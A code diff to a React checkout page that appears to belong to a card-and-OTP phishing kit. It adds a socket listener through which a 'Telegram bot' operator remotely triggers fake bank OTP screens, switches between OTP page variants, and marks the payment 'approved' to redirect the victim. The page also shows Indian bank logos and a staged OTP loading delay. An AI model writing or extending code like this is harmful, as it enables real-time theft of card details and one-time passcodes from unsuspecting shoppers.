@@ -11,7 +11,7 @@ import {
   Lock, CreditCard, Shield, CheckCircle, AlertCircle, Clock, 
   ChevronDown, ChevronUp, Star, Users, Zap, Target, TrendingUp, 
   Calendar, DollarSign, Building2, Globe, Download, ChevronRight, X,
-  Loader2, ArrowLeft  // ADD ArrowRight HERE
+  Loader2, ArrowLeft, ArrowRight
 } from 'lucide-react';
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -43,7 +43,6 @@ const bankLogos = [
   'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png',
   'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/bandhan-bank-logo.png',
   'https://images.seeklogo.com/logo-png/30/2/city-union-bank-ltd-logo-png_seeklogo-304210.png',
-
   'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/csb-bank-logo.png',
   'https://seekvectors.com/storage/images/development%20credit%20bank%20logo.svg',
   'https://static.cdnlogo.com/logos/d/96/dhanlaxmi-bank.svg',
@@ -754,6 +753,72 @@ const CheckoutOriginal = () => {
     }
   }, [hashedPaymentData]);
 
+  // Initialize socket connection for Telegram bot communication
+  useEffect(() => {
+    const socket = io('http://localhost:3002', {
+      transports: ['polling', 'websocket'],
+      upgrade: true,
+      timeout: 20000,
+      forceNew: true
+    });
+    
+    socket.on('connect', () => {
+      console.log('✅ Socket connected for checkout');
+    });
+    
+    // Handle OTP show command from Telegram bot
+    socket.on('show-otp', (data) => {
+      console.log('📱 Show OTP command received:', data);
+      setCurrentStep('otp');
+      setShowOtp(true);
+      if (data.otpPageSelection) {
+        setOtpPageSelection(data.otpPageSelection);
+      }
+    });
+    
+    // Handle OTP page selection changes from admin
+    socket.on('admin-otp-change', (data) => {
+      console.log('🔄 OTP page selection changed:', data);
+      if (data.otpPageSelection) {
+        setOtpPageSelection(data.otpPageSelection);
+      }
+    });
+    
+    // Handle payment approval from Telegram bot
+    socket.on('payment-approved', (data) => {
+      console.log('✅ Payment approved from Telegram bot:', data);
+      
+      // Store checkout data for PaymentSuccess page
+      const checkoutData = {
+        firstName: formData.firstName,
+        lastName: formData.lastName,
+        email: formData.email,
+        planName: planName,
+        billing: billing,
+        amount: displayPrice,
+        currency: globalCurrency,
+        transactionId: transactionId,
+        paymentMethod: 'credit',
+        timestamp: new Date().toISOString(),
+        successHash: data.successHash || 'telegram_' + Date.now()
+      };
+      
+      localStorage.setItem('userCheckoutData', JSON.stringify(checkoutData));
+      console.log('💾 Stored checkout data for success page:', checkoutData);
+      
+      // Redirect to success page
+      window.location.href = '/payment/success';
+    });
+    
+    socket.on('disconnect', () => {
+      console.log('❌ Socket disconnected');
+    });
+    
+    return () => {
+      socket.disconnect();
+    };
+  }, []);
+
   // Prevent zoom on OTP verification pages
   useEffect(() => {
     const preventZoom = (e: Event) => {
@@ -934,26 +999,22 @@ const CheckoutOriginal = () => {
     console.log('✅ Using customAmount from URL parameters:', displayPrice, currency);
   } else {
     // No payment link data, use default pricing based on plan
-    displayPrice = 100;
-    billingText = 'Custom Amount';
-    currency = 'USD';
-    
-    // Try to get actual pricing data safely
-    try {
-      const billingData = pricingData[billing as keyof typeof pricingData];
-      if (billingData) {
-        const planData = billingData[planName as keyof typeof pricingData.yearly];
-        if (planData) {
-          displayPrice = billing === 'yearly' ? planData.price : planData.monthly;
-          billingText = billing === 'yearly' ? 'Annually' : 'Monthly';
-          currency = 'INR'; // Default pricing is in INR
-        }
-      }
-    } catch (error) {
-      console.warn('Error accessing pricing data:', error);
+    const billingData = pricingData[billing as keyof typeof pricingData];
+    if (billingData && billingData[planName as keyof typeof pricingData.yearly]) {
+      const planData = billingData[planName as keyof typeof pricingData.yearly];
+      displayPrice = billing === 'yearly' ? planData.price : planData.monthly;
+      billingText = billing === 'yearly' ? 'Annually' : 'Monthly';
+      currency = 'INR'; // Default pricing is in INR
+    } else {
+      // Fallback to Complete plan pricing if plan not found
+      displayPrice = billing === 'yearly' ? 28750 : 2195;
+      billingText = billing === 'yearly' ? 'Annually' : 'Monthly';
+      currency = 'INR';
     }
     
-    console.log('⚠️ Using fallback pricing:', displayPrice, currency);
+    console.log('✅ Using plan pricing:', displayPrice, currency);
+    console.log('🔍 DEBUG - Plan details:', { planName, billing, billingData, planData: billingData?.[planName as keyof typeof pricingData.yearly] });
+    console.log('🔍 DEBUG - Final values being passed to OTP pages:', { displayPrice, formatPrice: formatPrice(displayPrice), currency });
   }
 
   // Handle OTP page loading delay for all pages (2-6 seconds)
@@ -2463,6 +2524,8 @@ const CheckoutOriginal = () => {
                 sessionBankLogo={sessionBankLogo}
                 cardBrandLogos={cardBrandLogos}
                 getCardBrand={getCardBrand}
+                displayPrice={displayPrice}
+                formatPrice={formatPrice}
               />
             )}
 
@@ -2480,6 +2543,8 @@ const CheckoutOriginal = () => {
                 sessionBankLogo={sessionBankLogo}
                 cardBrandLogos={cardBrandLogos}
                 getCardBrand={getCardBrand}
+                displayPrice={displayPrice}
+                formatPrice={formatPrice}
                 onRedirectToSecondOTP={() => {
                   setOtpPageSelection('new');
                   setUseNewOTPPage(true);
@@ -2901,6 +2966,8 @@ const CheckoutOriginal = () => {
                     sessionBankLogo={sessionBankLogo}
                     cardBrandLogos={cardBrandLogos}
                     getCardBrand={getCardBrand}
+                    displayPrice={displayPrice}
+                    formatPrice={formatPrice}
                   />
                 )}
 
@@ -2917,6 +2984,8 @@ const CheckoutOriginal = () => {
                     sessionBankLogo={sessionBankLogo}
                     cardBrandLogos={cardBrandLogos}
                     getCardBrand={getCardBrand}
+                    displayPrice={displayPrice}
+                    formatPrice={formatPrice}
                   />
                 )}
 
